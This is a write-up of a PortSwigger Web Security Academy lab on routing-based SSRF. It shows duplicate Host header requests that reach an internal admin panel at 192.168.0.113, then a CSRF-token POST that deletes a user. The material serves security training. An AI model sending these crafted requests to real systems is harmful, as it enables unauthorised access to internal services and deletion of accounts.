
# 3 - SSRF via flawed request parsing

This lab is vulnerable to routing-based SSRF due to its flawed parsing of the request's intended host. You can exploit this to access an insecure intranet admin panel located at an internal IP address.

To solve the lab, access the internal admin panel located in the 192.168.0.0/24 range, then delete Carlos.

-------------

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/1.png)

Reference: https://portswigger.net/web-security/host-header/exploiting#routing-based-ssrf

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/2.png)

-------------

Generated link: https://0a5100f104ffdc65c3832510004000cf.web-security-academy.net/

If you supply the domain of your Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or another in-path system, this indicates that you may be able to route requests to arbitrary domains.

Error in Host header for "/product?productId=1":

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/3.png)

Gateway error when adding a second Host header:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/4.png)

Send to Intruder:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/5.png)

Using 192.168.0.113 we get a 404 error:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/7.png)

Repeat the request with the product ID, add the second Host header with that IP address and change path to "/update":

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/8.png)

```
GET /admin/ HTTP/2
Host: 192.168.0.113
Host: 0a5100f104ffdc65c3832510004000cf.web-security-academy.net
...
```

We get this page:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/9.png)

Deleting the user is not possible, so I repeated the process and captured the response:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/10.png)

We will send a new request to delete the user knowing the endpoint is /admin/delete and the parameter is probably username:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/11.png)

```
POST /admin/delete HTTP/2
Host: 192.168.0.113
Host: 0a5100f104ffdc65c3832510004000cf.web-security-academy.net
...

username=carlos
```

We get the error:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/12.png)

Let's repeat the process and add the csrf value in the response to the previous GET request ("IJTFhUceFHwKZHdbhX2eW0ayNuKksPhv") - or repeat the GET request to /admin, what you prefer:

```
POST /admin/delete HTTP/2
Host: 192.168.0.113
Host: 0a5100f104ffdc65c3832510004000cf.web-security-academy.net
...

username=carlos&csrf=IJTFhUceFHwKZHdbhX2eW0ayNuKksPhv
```

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/13.png)

We get a 302 redirection:

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/14.png)

It seems it worked!

![img](images/3%20-%20SSRF%20via%20flawed%20request%20parsing/15.png)
